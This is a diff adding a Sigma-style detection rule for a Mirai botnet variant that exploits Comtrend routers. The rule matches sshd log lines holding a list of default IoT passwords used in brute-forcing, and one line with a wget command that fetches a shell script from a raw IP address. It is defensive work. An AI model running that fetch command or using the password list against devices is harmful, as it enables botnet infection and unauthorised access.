@@ -1,0 +1,57 @@
+title: IOT Linux Mirai VWISI Detection
+description: This new Mirai variant exploits CVE-2020-10173, a vulnerability in Comtrend VR-3033 routers. Similar to earlier variants, this Mirai variant uses telnet and SSH brute-forcing techniques to attack vulnerable devices.
+author: Furkan Celik
+reference:
+- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/IoT.Linux.MIRAI.VWISI?_ga=2.205787731.1157977601.1595567161-1562543453.1593580464
+- https://blog.trendmicro.com/trendlabs-security-intelligence/new-mirai-variant-expands-arsenal-exploits-cve-2020-10173/
+date: 2020/07/24
+tags:
+- attack.T1110
+- attack.Credential_Acces
+status: stable
+logsource:
+  product: linux
+  service: sshd
+detection:
+  condition: keyword or keyword1
+  keyword:
+  - taZz@23495859
+  - tsgoingon
+  - solokey
+  - telnetadmin
+  - 1001chin
+  - GM8182
+  - tl789
+  - oelinux123
+  - 5up
+  - vizxv
+  - xc3511
+  - jvbzd
+  - hg2x0
+  - Zte521
+  - grouter
+  - hunt5759
+  - telecomadmin
+  - twe8ehome
+  - h3c
+  - nmgx_wapia
+  - ROOT500
+  - ahetzip8
+  - anko
+  - blender
+  - ascend
+  - cat1029
+  - iDirect
+  - nflection
+  - antslq
+  - win1dows
+  - huigu309
+  - zhongxing
+  - t0talc0ntr0l4!
+  action: failure
+  keyword1:
+  - wget http://45.95.168.228/sn0rt.sh
+fields:
+- user
+- srcip
+level: high
